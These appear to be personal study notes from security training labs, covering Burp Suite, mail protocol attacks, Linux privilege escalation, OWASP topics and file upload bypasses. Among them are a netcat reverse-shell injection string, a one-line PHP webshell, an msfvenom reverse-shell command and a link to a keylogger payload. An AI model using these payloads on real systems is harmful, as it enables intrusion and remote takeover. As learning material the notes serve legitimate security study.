# R

* Remember for web/general/security

<hr class="sep-both">

## OWASP

* https://owasp.org/www-project-top-ten/
* Juiceshop
* https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
* https://github.com/OWASP/wstg
* https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
* https://github.com/OWASP/CheatSheetSeries
* https://www.zaproxy.org/
* https://github.com/OWASP/Amass
* https://cheatsheetseries.owasp.org/index.html

<hr class="sep-both">

## enum4linux

![Usage: Enumerating Information](https://img.shields.io/badge/usage-Enumerating%20Information-ffd700)

I don't know if there is still an `enum.exe`, because I can't find it, but you can use the tool [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) for enumerating information from Windows, and Samba hosts.

```bash
$ ./enum4linux.pl <options> <ip>
# -U : list of users
# -M : list of devices
# -S : list of shares
# -o : os data
# -i : printer data
# -v : verbose
```

<hr class="sep-both">

# Notes

* https://tryhackme.com/resources/blog/online-training-for-careers
* https://tryhackme.com/resources/blog/cyber-security-awareness-month
* There are websites on the Internet that allow you to check the reputation of an IP address to see whether it's malicious or suspicious.
  * AbuseIPDB
  * Cisco Talos Intelligence
  * https://ipinfo.io/
* https://www.virustotal.com/gui/home/upload
* https://www.hybrid-analysis.com/
* https://otx.alienvault.com/ (An open-source threat tracking system)
* https://secalerts.co/
* https://stack.watch/
* https://cybr.com/
* https://www.acunetix.com/blog/articles/

<hr class="sep-both">

# Notes

* netdiscover
* security triad: CIA.

## Burp

* take a request captured in the Proxy, edit it, and send the same request repeatedly as many times as we wish
* tabs per request
* Ctrl + R
* ISO/OSI
* Inspector to edit requets for those not familiar with HTML/...
* Ex: SQL Injection vulnerability
* Test endpoints, such as text, extremes (-1...), symbols...
* ...

Intruder

* use Intruder to fuzz for subdirectories, endpoints, or virtual hosts
* CTRL+I
* Options to flag results?
* § (silcrows ) not $ stupid
* automatically detected
* you can do it on headers too!
* 4 attack types
  * Sniper is the first and most common attack type (one set of payloads). If we have two values, it will try replacing the first by every word, then the second, but not both at the same time. (#words * #parameters). We attack only one parameter.
  * Battering Ram: take one too, but replace every param by the nth word. (#words)
  * Pitchfork is the attack type you are most likely to use. One payload set (wordlist) per parameter. The first of each tried simulataneously. (20 max)
  * Cluster bomb: test every combination (20 max, one w per p). #w1 * #wn. Create a hude amount of traffic, CE rate-limited.
* Payload set
  * Simple lists
  * Numbers (range...)
* Payload Processing: ex: capitalize, add prefix, add suffix...
* Start attack
  * Mark results as errors (based on response code/size) to filter results. We can click on a column to sort results.
* https://tryhackme.com/room/burpsuiteintruder (macros)
* Decoder
  * Input something, then use the menus to apply transformation on it (smart decode much like cyber-chief magic)
  * / is %2f (https://www.asciitable.com/ ascii then hex)
  * Gzip: Gzip provides a way to compress data. It is widely used to reduce the size of files and pages before they are sent to your browser.
  * Colors to see what transformation
* Comparer
  * Intercept requests
  * Repeater
  * If long responses
  * Send to comparer
  * Then identify what changed
* Sequencer allows us to measure the entropy (or randomness, in other words) of "tokens"
  * Live capture: capture a request generating tokens
  * Manual load: load a list of captured tokens
* "Cross-Site Request Forgery (CSRF) token protecting a form submission"
* https://tryhackme.com/room/burpsuiteom
* Extender
*  Burp App Store BApp Store (ex: Request Timer for time-based responses)
* Logger++
* Jython to use Python modules
* JRuby... https://github.com/jruby/jruby

<hr class="sep-both">

# xxx

Sending a mail involves a Mail Submission Agent (MSA) to send the mails to someone who can send it, a Mail Transfer Agent, which will send it to the Mail Delivery Agent, that will achieve it to the other Mail User Agent. MTA+MTA is common.

* Simple Mail Transfer Protocol (SMTP): use plaintext. port 25.
  * helo hostname
  * mail from:
  * rcpt to:
  * data
    * subject:
    * <CR>.<CR>
* POP3/IMAP are protocols to download mails from a MDA
  * Post Office Protocol version 3 (POP3, 110): USER/PASS to the server. STAT to find the number of mails, and the size of the mailbox. LIST to list new messages. RETR 1 to retrieve the "1rst" one. plaintext. Email is deleted once downloaded (default), but you would lose track or read/unread.
  * Internet Message Access Protocol (IMAP) - 143: LOGIN username password. Synchronisation: if you read something, then the status is updated on the server.
    * c1 LIST "" "*" (list emails in any folder)
    * c2 EXAMINE INBOX
    * c3 LOGOUT
    * Send as clear text

Servers implementing these protocols are subject to different kinds of attacks. To name a few, consider:

* Sniffing Attack (Network Packet Capture)
  * using a network packet capture tool to collect information about the target
  * Tcpdump is a free open source command-line interface (CLI) program that has been ported to work on many operating systems.
  * Wireshark is a free open source graphical user interface (GUI) program available for several operating systems, including Linux, macOS and MS Windows.
  * Tshark is a CLI alternative to Wireshark.
  * Before explaining this command, we should mention that this attack requires access to the network traffic, for example, via a wiretap or a switch with port mirroring. Alternatively, we can access the traffic exchanged if we launch a successful Man-in-the-Middle (MITM) attack.
  * `sudo tcpdump port 110 -A` (only port 110=POP3, and ASCII)
  * Wireshark: enter "pop" > same result but nicer
  * TLS have been added to HTTP, FTP, SMTP, POP3, and IMAP
* Man-in-the-Middle (MITM) Attack
  * A Man-in-the-Middle (MITM) attack occurs when a victim (A) believes they are communicating with a legitimate destination (B) but is unknowingly communicating with an attacker (E).
  * The attacker can modify the information send by the client, or sniff packets. It depends of the integrity checks/security of the protocol.
  * https://www.ettercap-project.org/
  * https://www.bettercap.org/
  * The solution lies in proper authentication along with encryption or signing of the exchanged messages. With the help of Public Key Infrastructure (PKI) and trusted root certificates, Transport Layer Security (TLS) protects from MITM attacks.
* SSL (Secure Sockets Layer) then TLS (more secure).
  * HTTPS: 443
  * FTPS: 990
  * SMTPS: 465
  * POP3S: 995
  * IMAPS: 993
  * They add an additional step when connected with the server, which is establishing a SSL/TLS connection
    * SSL: ClientHello (indicate supported algorithms)
    * Exchanges information to create a maser key
    * The server reply that it will use encryption
  * DOT (DNS Over TLS)
* Password Attack (Authentication Attack)
  * hydra -d, for debugging
  * Mitigations: https://tryhackme.com/room/protocolsandservers2

<hr class="sep-both">

# Vulnerabilities

--- https://tryhackme.com/room/vulnerabilities101

vulnerabilities = weakness or flaw.  five main categories of vulnerabilities

* Operating System
* (Mis)Configuration-based
* Weak or Default Credentials
* Application Logic
* Human-Factor

Types

* Remote code execution
* Version Disclosure

Not all vulnerabilities are exploitable.

*  the popular Common Vulnerability Scoring System (CVSS, 2005, free+opens-source) awards points to a vulnerability based upon its features, availability, and reproducibility. It takes into account the impact on the CIA triad, the ease of use, and the existence of exploits. https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
* Vulnerability Priority Rating (VPR): modern, based on the risks to an org

* “Common Vulnerabilities and Exposures”
* https://nvd.nist.gov/vuln/full-listing

* many clients -> there is possiblity a custom/helpdesk that can be used to attck

--- https://tryhackme.com/jr/exploitingavulnerabilityv2

Nessus: do not be dependent, they often do not find every vulnerability. They are loud/generate a lot of logs/traffic.

* Security Misconfigurations (cyrpto), and Insecure Deserialization, and not THM for the 4 categories?
* https://tryhackme.com/room/exploitingavulnerabilityv2
* https://www.rapid7.com/db/: instructions for metasploit may be given
* GitHub by keywords such as “PoC”, “vulnerability”
* searchsploit
  * searchsploit xxx
  * searchsploit -p 47887

--- https://tryhackme.com/room/vulnerabilitycapstone

<hr class="sep-both">

# Linux privilege esc

* https://tryhackme.com/room/linprivesc

```
Resetting passwords
Bypassing access controls to compromise protected data
Editing software configurations
Enabling persistence
Changing the privilege of existing (or new) users
Execute any administrative command
```

* hostname can be used to find the role of the foothold user (ex: website-dev)
* uname -a (kernel)
* /proc/version (processes, kernel version?, is gcc installed?)
* /etc/issue (maybe used to find the system)
* `ps -A: View all running processes` / `ps axjf: View process tree`
* see all users
* see the network interfaces/routes/communications (https://tryhackme.com/room/linprivesc netcat)
* (https://tryhackme.com/room/linprivesc find?)
* Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.
* https://www.linuxkernelcves.com/cves
* LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
* https://tryhackme.com/room/linprivesc (hint/notes)
* LD_PRELOAD is a function that allows any program to use shared libraries. (https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)
* `find / -type f -perm -04000 -ls 2>/dev/null`
* on nano: use it to read/write shadow/...
* https://tbhaxor.com/exploiting-suid-binaries-to-get-root-user-shell/
* https://ctf101.org/
* https://devansh.xyz/osint/2021/09/11/weaponizing-favicon-ico.html
* https://github.com/devanshbatham/Awesome-Bugbounty-Writeups
* Add new user

<hr class="sep-both">

# Random

* ftp://IP:port
* ftp xxx@IP -p port
* nmap –script=http-server-header.nse XXX (or -sC)
* http://www.itsecgames.com/index.htm
* https://attack.mitre.org/tactics/enterprise/
* https://appsec-labs.com/online-training/
* https://www.contrastsecurity.com/developer
* https://github.com/trickest/cve
* https://github.com/payloadbox
* https://github.com/michenriksen/aquatone
* https://github.com/projectdiscovery/subfinder
* https://github.com/s0md3v/Photon
* https://github.com/evyatarmeged/Raccoon
* https://github.com/laramies/theHarvester
* https://github.com/topics/osint (4.2)

<hr class="sep-both">

# XXX

--- https://tryhackme.com/room/owasptop10

* https://tryhackme.com/room/owasptop10 (note about remediation)
* `;nc -e /bin/bash` (no every nc variant support `-e`, see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* https://www.php.net/manual/en/function.passthru.php (past command output raw?)
* cmd "ver" to see Windows version
* two user with the same username, such as "admin", and " admin". They say you can access the other account if things were done wrongly, but HOW?
* Sensitive Data Exposure: app that discloses user sensitive data accidentally (ex: database source...)
* ps -ef
* file xxx.db => sqlite3 file.db
  * .tables
  * PRAGMA table_info(table);
* XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data (in-band and out-of-band/blind)
  * It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. 
  * DoS SSRF
* Every XML document mostly starts with what is known as XML Prolog.
* <?xml version="1.0" encoding="UTF-8"?>
* XML allows validation using DTD and Schema.
* https://tryhackme.com/room/owasptop10 (details + DTD)
* see writeups
* https://owasp.org/www-project-secure-headers/
* https://duckduckgo.com/?q=2016%2C+Dyn&atb=v332-1&ia=web
* http://www.xss-payloads.com/index.html
* http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html
* get target ip: window.location.hostname
* Replacing data with malicious code: Insecure Deserialisation
  * Coookies => user can edit values from its side, can decode them...
  * Ex: flask in Python pickle.load, that can load a cookie in which the base64 
  * encoded value could be a reverse shell.
* do good logging / do not display too much info about errors
* https://tryhackme.com/room/owasptop10 (notes, last)

--- https://tryhackme.com/room/owaspjuiceshop

* Recon by making requests pass through burp
* Email injection
* https://tryhackme.com/room/owaspjuiceshop
* ...

--- https://tryhackme.com/room/uploadvulns

* do not override an existing file. Usual practices are generating/assigning a name to the uploaded file. There could be prefixed/postfixed too. They could be checks if the name is taken.
* webshells, and reverse/bind shells. Realistically a fully featured reverse/bind shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads, or if firewall rules prevent any network-based shells)
* <?=system($_GET["cmd"] ?? "whoami");?>
* https://github.com/pentestmonkey/php-reverse-shell
* filter extensions (blacklist/whitelist)
* file type (MIME validation=Content-Type=<type>/<subtype>=https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types, Magic Number validation=bytes at the beginning of the file)
* file length
* file name (check not overriding protected file)
* file content
* Client-side: turn off JS, intercept (page:remove JS, file: edit), do the request manually: `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`
* BurpSuite intercept javascript: you need to remove `^js$` in options > intercept client requests / File extension does not match. You may have to clear the cache. https://stackoverflow.com/questions/37296343/modify-javascript-with-burp-if-js-is-in-separate-file-but-gets-loaded-in-the-s
* pathinfo to get the extension, then a blacklist with a switch. We can pass it easily with values such as PhP pHP... or php5... .phtml... https://en.wikipedia.org/wiki/PHP
* hexeditor to edit the hex of a file. Write X letters, save, open in hex editor, and replace them with magic number: https://en.wikipedia.org/wiki/List_of_file_signatures
* writeups
* Inspect the client side, try using valid files, see where it lands, what's the naming scheme... Test really weird extensions, to see if blacklist or whitelist. Try the geniune file with a malicious magic number, to see what is checked.
* check the server size filter
* gobuster check the size of the element found
* whatweb url

```
URL [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.196.97], JQuery[3.5.1], Object[image/svg+xml], Script, Title[Jewel], UncommonHeaders[access-control-allow-origin,front-end-https], X-Powered-By[Express], nginx[1.14.0]
```

* msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4455 -o shell.js
* `data:text/javascript;base64,` (can append directly)
* https://blog.cyberethical.me/
* stat xxx.file